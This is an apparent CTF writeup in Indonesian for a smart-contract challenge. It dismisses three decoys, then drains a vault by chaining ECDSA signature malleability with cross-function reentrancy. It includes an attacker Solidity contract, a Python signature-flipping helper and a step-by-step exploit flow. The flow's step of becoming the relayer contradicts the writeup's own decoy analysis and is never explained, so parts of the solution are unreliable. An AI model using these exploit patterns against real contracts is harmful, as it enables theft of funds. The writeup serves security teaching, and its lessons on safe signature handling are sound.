# Phantom Ledger — Writeup Resmi (Bahasa Indonesia)

**Kategori:** Blockchain + Kriptografi  
**Difficulty:** Hard  
**Flag:** `COMPFEST18{...}` (dinamis per instance)

---

## Deskripsi Challenge

> *Phantom Ledger adalah vault gasless transaction terdepan. User cukup deposit ETH dan tandatangani pesan untuk withdrawal — tidak perlu bayar gas! Relayer kami yang mengurus semuanya. Dengan proteksi reentrancy, fee system yang aman, dan manajemen relayer dua langkah, kami yakin tidak ada yang bisa membobol vault ini...*
>
> **Misi:** Kuras semua ETH dari kontrak PhantomVault.

### Apa yang Diberikan ke Peserta

- Source code `Setup.sol` dan `PhantomVault.sol`
- 5 ETH untuk gas dan interaksi
- Vault berisi 10 ETH (deposit deployer)

---

## Langkah 1: Analisis Awal

### Overview Kontrak

`PhantomVault` adalah vault dengan fitur-fitur berikut:

1. **Deposit/Withdraw** — Deposit dan withdraw ETH standar
2. **Gasless Relay** — User tandatangani pesan, relayer submit on-chain
3. **Fee System** — Fee (basis points) dipotong dari relayed withdrawal, dikirim ke `feeRecipient`
4. **Credit Transfer** — Transfer saldo internal antar akun
5. **Relayer Management** — Mekanisme propose/confirm untuk ganti relayer

### Scan Vulnerability Awal

Audit cepat mengungkap beberapa area "mencurigakan":

---

## Langkah 2: Identifikasi Decoy

### ❌ Decoy 1: Reentrancy di `withdraw()`

```solidity
function withdraw(uint256 amount) external nonReentrant {
    require(balances[msg.sender] >= amount, "Insufficient balance");
    balances[msg.sender] -= amount;  // ← State di-update SEBELUM call
    (bool success, ) = payable(msg.sender).call{value: amount}("");
    require(success, "ETH transfer failed");
}
```

**Analisis:**
- ✅ Modifier `nonReentrant` aktif
- ✅ State di-update sebelum external call (CEI pattern)
- ✅ Bahkan tanpa guard, re-enter `withdraw()` akan gagal karena `balances` sudah dikurangi

**Kesimpulan:** Aman. Low-level `call` bukan berarti reentrancy — yang penting state sudah di-update duluan.

### ❌ Decoy 2: Integer Overflow di Fee

```solidity
unchecked {
    fee = (amount * feeRate) / 10000;
}
```

**Analisis:**
- `feeRate` dibatasi `MAX_FEE_RATE = 500` di `setFeeRate()`
- Untuk overflow: `amount * 500` butuh `amount > 2^256 / 500 ≈ 2.3 × 10^74`
- Tidak ada user yang bisa deposit sebanyak itu

**Kesimpulan:** Aman. `unchecked` memang menghilangkan proteksi overflow, tapi nilai `feeRate` yang di-cap membuat overflow mustahil.

### ❌ Decoy 3: Access Control Relayer

Mekanisme ganti relayer:
1. Owner panggil `proposeRelayer(newRelayer)` 
2. Relayer saat ini harus panggil `confirmRelayerChange()` dalam 1 jam

**Analisis:**
- `proposeRelayer` → hanya owner
- `confirmRelayerChange` → hanya relayer saat ini
- Window 1 jam → relayer harus aktif kooperasi

**Kesimpulan:** Aman. Tanpa private key relayer, konfirmasi mustahil.

---

## Langkah 3: Menemukan Vulnerability Asli

Setelah menyingkirkan 3 decoy, kita perlu melihat lebih dalam ke mekanisme `relayWithdraw` dan interaksinya dengan fungsi lain.

### Vulnerability 1: ECDSA Signature Malleability

Kontrak memverifikasi signature menggunakan `ecrecover` mentah:

```solidity
function _recoverSigner(bytes32 hash, bytes memory sig) internal pure returns (address) {
    bytes32 r; bytes32 s; uint8 v;
    assembly {
        r := mload(add(sig, 32))
        s := mload(add(sig, 64))
        v := byte(0, mload(add(sig, 96)))
    }
    if (v < 27) { v += 27; }
    return ecrecover(hash, v, r, s);
}
```

**Masalahnya:** ECDSA signature punya sifat **malleability**. Untuk setiap signature valid $(v, r, s)$, ada signature lain $(v', r, s')$:

$$s' = n - s$$

dimana $n$ = `0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141` (order kurva secp256k1).

Kedua signature ini menghasilkan **signer yang sama**, tapi byte-nya **berbeda**.

Replay protection di kontrak:
```solidity
bytes32 sigHash = keccak256(signature);
require(!usedSignatures[sigHash], "Signature already used");
usedSignatures[sigHash] = true;
```

Karena byte signature berbeda → hash berbeda → **replay check di-bypass!**

**Fix yang benar:** Gunakan OpenZeppelin `ECDSA.recover()` yang memvalidasi bahwa `s` berada di "lower half" kurva order.

### Vulnerability 2: Cross-Function Reentrancy

Dua fungsi yang mengakses `mapping balances` yang sama:

```solidity
function relayWithdraw(...) external onlyRelayer nonReentrant { ... }  // ← ADA guard
function transferCredit(...) external { ... }                          // ← TIDAK ADA guard
```

Saat `relayWithdraw` mengirim fee:
```solidity
(bool feeSuccess, ) = payable(feeRecipient).call{value: fee}("");
```

Call ke `feeRecipient` memberikan kontrol eksekusi ke kontrak penyerang. Di titik ini:
- ✅ Balance signer sudah dikurangi (effects applied)
- ✅ `nonReentrant` lock aktif untuk `relayWithdraw`
- ❌ TAPI `transferCredit()` tetap bisa dipanggil!

---

## Langkah 4: Membangun Exploit

### Kontrak Exploit

```solidity
contract MaliciousFeeRecipient {
    IPhantomVault public vault;
    address public attacker;
    address public deployer;

    constructor(address _vault, address _deployer) {
        vault = IPhantomVault(_vault);
        attacker = msg.sender;
        deployer = _deployer;
    }

    receive() external payable {
        // Dipanggil saat relayWithdraw kirim fee
        // transferCredit TIDAK dilindungi nonReentrant!
        uint256 deployerBal = vault.balances(deployer);
        if (deployerBal > 0) {
            vault.transferCredit(deployer, attacker, deployerBal);
        }
    }
}
```

### Script Python — Signature Malleability

```python
# Konstanta kurva secp256k1
SECP256K1_N = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141

def malleable_signature(v, r, s):
    """Hitung signature malleable yang recover signer yang sama"""
    s_prime = SECP256K1_N - s
    v_prime = 28 if v == 27 else 27
    return v_prime, r, s_prime
```

### Alur Exploit

```
1. Deploy MaliciousFeeRecipient
2. Jadi relayer + set feeRecipient ke kontrak exploit
3. Deposit ETH ke vault (untuk punya balance)
4. Sign withdrawal message
5. Panggil relayWithdraw (original signature)
   └─ Balance dikurangi, fee dikirim ke exploit contract
   └─ receive() → transferCredit(deployer, attacker, 10 ETH)
6. Panggil relayWithdraw (malleable signature)
   └─ Bypass replay check! (hash signature berbeda)
   └─ Exploit berulang
7. Withdraw semua credit
8. Vault kosong → isSolved() = true → FLAG! 🚩
```

---

## Pelajaran

1. **Jangan pakai `ecrecover` mentah** — Selalu gunakan OpenZeppelin `ECDSA.recover()` yang cek signature malleability
2. **Reentrancy guard harus cover SEMUA fungsi yang share state** — `nonReentrant` di satu fungsi tidak cukup kalau fungsi lain akses mapping yang sama
3. **Replay protection harus hash MESSAGE, bukan SIGNATURE** — `keccak256(signature)` rentan malleability, gunakan `keccak256(signer, to, amount, nonce)` sebagai gantinya
4. **Audit lintas-domain itu penting** — Celah kriptografi + celah smart contract bisa di-chain untuk serangan yang devastating

---

## Referensi

- [EIP-2: Homestead Hard-fork Changes](https://eips.ethereum.org/EIPS/eip-2)
- [SWC-117: Signature Malleability](https://swcregistry.io/docs/SWC-117)
- [SWC-107: Reentrancy](https://swcregistry.io/docs/SWC-107)
- [OpenZeppelin ECDSA Library](https://docs.openzeppelin.com/contracts/4.x/api/utils#ECDSA)
